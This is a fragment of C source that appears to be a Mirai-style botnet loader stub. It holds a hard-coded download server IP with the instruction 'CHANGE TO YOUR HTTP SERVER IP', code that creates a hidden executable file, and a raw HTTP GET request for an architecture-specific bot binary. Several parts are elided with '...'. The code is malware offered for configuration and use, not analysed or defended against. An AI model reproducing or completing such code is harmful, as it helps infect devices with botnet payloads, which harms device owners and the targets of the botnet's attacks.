...
#define HTTP_SERVER utils_inet_addr(179,43,156,149) // CHANGE TO YOUR HTTP SERVER IP

#define EXEC_MSG            "loud\n"
...
inline void run(void)
{
    ...
    ffd = open(".a2b1d5g2e5t8vc", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /z0l1mxjm4mdl4jjfjf7sb2vdmv/KKveTTgaAAsecNNaaaa." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
